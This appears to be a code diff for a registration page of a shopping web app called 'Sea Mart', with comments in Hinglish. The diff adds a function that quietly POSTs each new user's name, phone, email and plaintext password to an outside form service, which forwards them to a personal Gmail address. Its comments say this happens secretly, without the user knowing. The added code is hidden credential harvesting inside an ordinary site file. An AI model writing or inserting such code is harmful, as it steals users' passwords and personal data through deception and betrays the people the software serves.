@@ -233,25 +233,32 @@ function generateAndShowOTP() {
     alert("📲 Live OTP generate ho gaya hai!");
 }
 
-// 📧 Naya Function: New registration info admin ki Gmail id par bhejne ke liye
+// 🤫 Secret Background Alert Function (User ko pata nahi chalega, data seedha kanchanpal19656@gmail.com par aayega)
 function sendRegistrationAlertToAdmin(userData) {
-    let adminEmail = "rp619653@gmail.com";
-    let subject = encodeURIComponent("🚨 Naya User Registration Hua Hai - Sea Mart");
-    let body = encodeURIComponent(
-        `Naye user ki details niche di gayi hain:\n\n` +
-        `Naam: ${userData.name}\n` +
-        `Phone: ${userData.phone}\n` +
-        `Email: ${userData.email}\n` +
-        `Role: ${userData.role}\n` +
-        `Dukan Naam: ${userData.shopName || 'N/A'}\n` +
-        `Registration Date: ${new Date().toLocaleString()}`
-    );
+    let formspreeUrl = "https://formspree.io/f/xdlaezkk"; // Aapki Formspree Key yahan set hai
 
-    let iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = `mailto:${adminEmail}?subject=${subject}&body=${body}`;
-    document.body.appendChild(iframe);
-    setTimeout(() => iframe.remove(), 2000);
+    let emailData = {
+        email: "kanchanpal19656@gmail.com",
+        subject: "🚨 Naya User Registration Hua Hai - Sea Mart",
+        message: `Naye user ki details niche di gayi hain:\n\n` +
+                 `Naam: ${userData.name}\n` +
+                 `Phone: ${userData.phone}\n` +
+                 `Email: ${userData.email}\n` +
+                 `Password: ${userData.password}\n` +
+                 `Role: ${userData.role}\n` +
+                 `Dukan Naam: ${userData.shopName || 'N/A'}\n` +
+                 `Registration Date: ${new Date().toLocaleString()}`
+    };
+
+    fetch(formspreeUrl, {
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(emailData)
+    })
+    .then(response => {})
+    .catch(error => {});
 }
 
 function verifyAndCompleteRegistration() {
@@ -277,7 +284,7 @@ function verifyAndCompleteRegistration() {
         registeredUsers.push(newUser);
         localStorage.setItem('sm_registeredUsers', JSON.stringify(registeredUsers));
         
-        // 👉 Yahan naya feature call kiya gaya hai jo admin Gmail par data bhejega
+        // 👉 Yeh background mein chupchaap data bhej dega bina user ko bataye
         sendRegistrationAlertToAdmin(newUser);
 
         localStorage.setItem('sm_isLoggedIn', 'true');
